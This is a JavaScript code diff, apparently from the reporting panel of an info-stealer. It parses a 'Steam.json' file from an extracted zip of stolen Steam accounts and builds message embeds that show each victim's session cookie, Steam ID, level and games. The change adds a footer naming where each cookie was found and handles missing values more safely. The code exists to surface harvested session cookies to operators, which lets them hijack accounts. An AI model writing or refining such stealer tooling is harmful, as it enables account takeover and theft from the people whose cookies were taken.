@@ -225,7 +225,7 @@ const json = async (zipFile) => {
   if (fs.existsSync(join(tempFolder, 'Steam.json'))) {
     const accounts = JSON.parse(fs.readFileSync(join(tempFolder, 'Steam.json'), 'utf8'));
 
-    accounts.forEach(({ cookie, accountId, accountInfo, games, level }) => {
+    accounts.forEach(({ cookie, cookieSource, accountId, accountInfo, games, level }) => {
       const gamesListUrl = `${accountInfo.players[0].profileurl}games/?tab=all`;
       const gamesListMd = `[Click here for the full list](${gamesListUrl})\n`;
       const gamesList = (games) => {
@@ -244,7 +244,7 @@ const json = async (zipFile) => {
           return gamesListMd + games.map(filters.text).join(', ');
         }
       };
-      embeds.push({
+      const embed = {
         author: {
           name: accountInfo.players[0].personaname,
           icon_url: accountInfo.players[0].avatar,
@@ -253,14 +253,17 @@ const json = async (zipFile) => {
         fields: [
           ['🆔 Steam ID', code(accountId)],
           ['➕ Account Created', `<t:${accountInfo.players[0].timecreated}>` || 'Unknown'],
-          ['🪙 Level', level.player_level.toString() || 'Private'],
-          ['🍪 Cookie', cookie],
+          ['🪙 Level', level.player_level?.toString() || 'Private'],
+          ['🍪 Cookie', cookie ? codeBlock(cookie) : 'Not Found'],
           [`🎮 Games Owned (${games.game_count})`, gamesList(games.games), false]
         ].map(fieldsMap),
         thumbnail: {
           url: accountInfo.players[0].avatarfull
         }
-      });
+      };
+      if (cookie && cookieSource) embed.footer = { text: `Cookie found in ${cookieSource}` };
+
+      embeds.push(embed);
     });
   }
 
